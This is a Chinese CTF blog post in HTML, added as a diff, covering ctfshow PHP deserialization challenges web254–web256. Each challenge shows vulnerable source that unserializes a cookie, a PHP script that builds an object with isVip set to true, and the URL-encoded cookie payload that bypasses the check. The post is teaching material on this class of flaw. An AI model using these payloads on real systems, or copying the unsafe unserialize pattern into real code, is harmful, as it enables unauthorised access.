@@ -1,0 +1,579 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="j0ker">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="web254123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-02 17:44:47# @Last Modified">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow之反序列化">
+<meta property="og:url" content="http://example.com/2022/05/06/ctfshow-unserialize/index.html">
+<meta property="og:site_name" content="j0ker&#39;s blog">
+<meta property="og:description" content="web254123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-02 17:44:47# @Last Modified">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/cover/9.jpg">
+<meta property="article:published_time" content="2022-05-06T12:14:25.000Z">
+<meta property="article:modified_time" content="2022-05-10T01:20:50.145Z">
+<meta property="article:author" content="j0ker">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/cover/9.jpg">
+  
+  
+  <title>ctfshow之反序列化 - j0ker&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+  
+<link rel="stylesheet" href="/xm_custom/custom.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>j0ker&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="ctfshow之反序列化">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-05-06 20:14" pubdate>
+        2022年5月6日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      9.7k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      81 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">ctfshow之反序列化</h1>
+            
+            <div class="markdown-body">
+              <h3 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h3><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-12-02 17:44:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-12-02 19:29:02</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVip</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-variable">$p</span>)&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;isVip=<span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vipOneKeyGetFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;isVip)&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is &quot;</span>.<span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip, no flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> ctfShowUser();<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;login(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;checkVip())&#123;<br>            <span class="hljs-variable">$user</span>-&gt;vipOneKeyGetFlag();<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip,no flag&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>首先接收username和password两个参数，再进行实例化ctfShowUser类，进入login方法进行判断，这里只要参数与username、password属性相等即可。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">username=xxxxxx&amp;password=xxxxxx<br></code></pre></td></tr></table></figure>
+
+<h3 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-12-02 17:44:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-12-02 19:29:02</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVip</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vipOneKeyGetFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;isVip)&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is &quot;</span>.<span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip, no flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = unserialize(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);    <br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;login(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;checkVip())&#123;<br>            <span class="hljs-variable">$user</span>-&gt;vipOneKeyGetFlag();<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip,no flag&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>$_COOKIE[‘user’]作为反序列化入口点</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-variable">$a</span>= <span class="hljs-keyword">new</span> ctfShowUser();<br><span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>将isVip改成true,再进行序列化，传参。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#get</span><br>username=xxxxxx&amp;password=xxxxxx<br><span class="hljs-comment">#header</span><br>Cookie: user=O%<span class="hljs-number">3</span>a11%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;ctfShowUser&quot;</span>%<span class="hljs-number">3</span>a3%<span class="hljs-number">3</span>a&#123;s%<span class="hljs-number">3</span>a8%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;username&quot;</span>%<span class="hljs-number">3</span>bs%<span class="hljs-number">3</span>a6%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;xxxxxx&quot;</span>%<span class="hljs-number">3</span>bs%<span class="hljs-number">3</span>a8%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;password&quot;</span>%<span class="hljs-number">3</span>bs%<span class="hljs-number">3</span>a6%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;xxxxxx&quot;</span>%<span class="hljs-number">3</span>bs%<span class="hljs-number">3</span>a5%<span class="hljs-number">3</span>a<span class="hljs-string">&quot;isVip&quot;</span>%<span class="hljs-number">3</span>bb%<span class="hljs-number">3</span>a1%<span class="hljs-number">3</span>b&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-12-02 17:44:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-12-02 19:29:02</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkVip</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;isVip;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;username===<span class="hljs-variable">$u</span>&amp;&amp;<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vipOneKeyGetFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;isVip)&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;username!==<span class="hljs-keyword">$this</span>-&gt;password)&#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;your flag is &quot;</span>.<span class="hljs-variable">$flag</span>;<br>              &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip, no flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$username</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$username</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$password</span>))&#123;<br>    <span class="hljs-variable">$user</span> = unserialize(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);    <br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;login(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>-&gt;checkVip())&#123;<br>            <span class="hljs-variable">$user</span>-&gt;vipOneKeyGetFlag();<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no vip,no flag&quot;</span>;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure>
+
+<p>和上题的操作一样，这里还需要username与password不相等。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfShowUser</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;b&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$isVip</span>=<span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-variable">$a</span>= <span class="hljs-keyword">new</span> ctfShowUser();<br><span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>传参</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#get</span><br>username=a&amp;password=b <br><br><span class="hljs-comment">#header</span><br>Cookie: user=O%<span class="hljs-number">3</span>A11%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>ctfShowUser%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A8%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>username%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>a%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A8%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>password%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>b%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>isVip%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure>
+
